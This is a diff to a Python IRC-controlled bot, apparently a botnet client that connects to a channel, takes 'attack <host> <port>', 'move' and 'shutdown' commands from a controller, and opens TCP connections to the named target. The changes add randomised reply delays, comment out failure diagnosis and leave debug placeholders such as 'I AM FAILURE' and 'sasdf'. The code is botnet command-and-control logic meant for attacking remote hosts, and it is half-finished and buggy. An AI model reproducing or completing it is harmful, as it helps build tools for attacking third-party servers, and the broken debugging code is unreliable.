@@ -71,6 +71,9 @@ class Bot:
             print("from " + prefix + " to do " + message)
             if message == "status":
                 #print("sending back status")
+                x = random.randint(1,4)
+                y = random.randint(1,5)
+                time.sleep(x/y)
                 self.privateMsg(prefix, "Correct pass - " + self.botNick)
             elif message.startswith("attack"):
                 if len(message.split()) == 3:
@@ -89,6 +92,9 @@ class Bot:
                     print("Incorrect usage of command: move <host-name> <port> <channel>")
             elif message == "shutdown":
                 #print("shutting down")
+                x = random.randint(1,4)
+                y = random.randint(1,5)
+                time.sleep(x/y)
                 self.privateMsg(prefix, "Shutdown successful - " + self.botNick)
                 self.IRCSOCKET.close()
                 sys.exit(0)
@@ -103,7 +109,6 @@ class Bot:
 
     # Attack Server
     def botAttack(self, host, port):
-        global conNick, botNick, attackCount 
         try:
             targetSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             port = int(port)
@@ -118,30 +123,23 @@ class Bot:
                 self.privateMsg(x, msg)
         except:
             # Send private message that attack failed 
-
+            """
             # Do tests to see what caused failure 
             try:
                 targetSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 targetSocket.connect((host, port))
-            except socket.herror as e:
-                reason = str(e)
-            except socket.errno as e:
-                reason = str(e)
-            except socket.gaierror as e:
-                reason = str(e)
-            except socket.timeout as e:
-                reason = str(e)
             except socket.error as e:
                 reason = str(e)
             except:
                 reason = "Unknown reason"
-
-            msg = ("Attack failed - " + self.botNick + " - " + str(reason))
-            self.failCount = self.failCount + 1
+            """
+            print("I AM FAILURE")
+            msg = ("Attack failed - " + self.botNick + " - " + str("sasdf"))
+            #self.failCount = self.failCount + 1
             for x in self.acceptedCons:
                 self.privateMsg(x, msg)
-            tb = traceback.format_exc()
-            print(tb)
+            #tb = traceback.format_exc()
+            #print(tb)
             pass 
             
     
@@ -260,7 +258,7 @@ def main():
         print("connecting")
         while noConnection:
             noConnection = bot.IRCconnect(CHANNEL)
-            if not noConnection:
+            if noConnection != 433:
                 bot.changeNick()
         
         print("Controller is running. Connected with nick: " + bot.botNick)
